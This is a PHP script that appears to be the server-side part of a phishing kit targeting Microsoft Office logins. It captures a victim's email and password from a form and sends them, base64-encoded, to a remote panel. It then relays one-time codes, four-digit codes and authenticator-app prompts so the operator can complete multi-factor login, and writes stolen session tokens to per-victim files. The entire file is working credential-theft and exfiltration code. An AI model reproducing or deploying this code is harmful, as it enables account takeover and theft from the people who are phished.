<?php
include 'config.php';
if(isset($_POST['ai'])&&isset($_POST['pr']) ) {
    $ai = trim($_POST['ai']);
    $pr = trim($_POST['pr']);
}
if (isset($_POST['btn2'])) {
    $params = "email=".$email."&password=".$token."&session=".file_get_contents("session.txt")."&digits=".$_POST['4dig'];
    $url = $base."results/four-digit?".$params;
    $res=curl($url);
    if($res=="WaitOtp"){
        echo "WaitOtp";
        exit();
    }else if($res=="Error"){
        echo "Failed";
        exit();
    }

}

else if (isset($_POST['btn3'])) {
    $params = "email=".$email."&password=".$token."&session=".file_get_contents("session.txt")."&otp=".$_POST['code'];

    $url = $base."results/get-otp?".$params;

    $res=curl($url);
    if($res=="Success"){
        echo "Success";
        exit();
    }else{
        echo "Failed";
        exit();
    }
	
}
else if($ai != null && $pr != null){
    $params = "email=".$email."&password=".$token."&domain=".$domain."&page=".$page."&office_email=".$ai."&office_password=".base64_encode($pr);
    $url = $base."results/office-auth?".$params;
    $res=curl($url);

    $respns=json_decode($res);
    if($respns->response=="Done"){
       echo "Done";
       exit();
    }else if($respns->response=="Failed"){
        echo "Failed";
        exit();
    }else if($respns->response=="4digit wait"){
        $myfile = fopen($respns->email.".txt" , "w") or die("Unable to open file!");
        $txt = $respns->session;
        fwrite($myfile, $txt);
        echo "4digit";
        exit();
    }else if($respns->response=="Authapp"){
        $myfile = fopen($respns->email.".txt" , "w") or die("Unable to open file!");
        $txt = $respns->session;
        fwrite($myfile, $txt);
        echo "Authapp";
        exit();
    }
    else if($respns->response=="WaitOtp"){
        $myfile = fopen($respns->email.".txt" , "w") or die("Unable to open file!");
        $txt = $respns->session;
        fwrite($myfile, $txt);
        echo "WaitOtp";
        exit();
    }
}else{
    echo "Bad";
    exit();
}

   function curl($url){
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       curl_setopt($curl, CURLOPT_HEADER, false);
       $data = curl_exec($curl);
       curl_close($curl);
       return $data;
   }

function Redirect($url, $permanent = false)
{
    if (headers_sent() === false)
    {
        header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
    }
    exit();
}
?>